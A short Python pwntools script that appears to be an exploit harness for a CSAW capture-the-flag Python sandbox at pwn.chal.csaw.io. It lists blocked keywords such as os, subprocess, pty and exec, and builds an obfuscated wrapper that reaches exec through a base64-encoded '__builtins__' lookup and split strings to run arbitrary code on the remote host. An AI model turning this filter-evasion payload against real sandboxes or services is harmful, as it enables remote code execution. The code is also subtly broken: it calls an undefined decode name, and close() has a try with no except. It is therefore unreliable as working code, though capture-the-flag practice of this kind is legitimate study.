from pwn import *
context.log_level = 'error'

BLACK = ['__builtins__', '__import__', 'eval', 'exec', 'import', 'from', 'os', 'sys',
         'timeit', 'base64commands', 'subprocess', 'pty', 'platform', 'open', 'read',
         'write', 'dir', 'type']

WRAP = "getattr(globals()[HrjYMvtxwA(b'X19idWlsdGluc19f').decode()],'ex'+'ec')(bytes(%s))"

def build(code):
    line = WRAP % (list(code.encode()).__repr__(),)
    for b in BLACK:
        if b in line:
            raise SystemExit("blacklisted substring %r in payload" % b)
    return line

class Sbx:
    def __init__(self, host='pwn.chal.csaw.io', port=8000, timeout=15):
        self.p = remote(host, port)
        self.p.recvuntil(b'>>> ')
        self.timeout = timeout
    def send(self, line, timeout=None):
        self.p.sendline(line.encode())
        try:
            return self.p.recvuntil(b'>>> ', timeout=timeout or self.timeout).decode(errors='replace')
        except Exception as e:
            return "TIMEOUT/ERR: %s" % e
    def run(self, code, timeout=None):
        return self.send(build(code), timeout)
    def close(self):
        try: self.p.close()
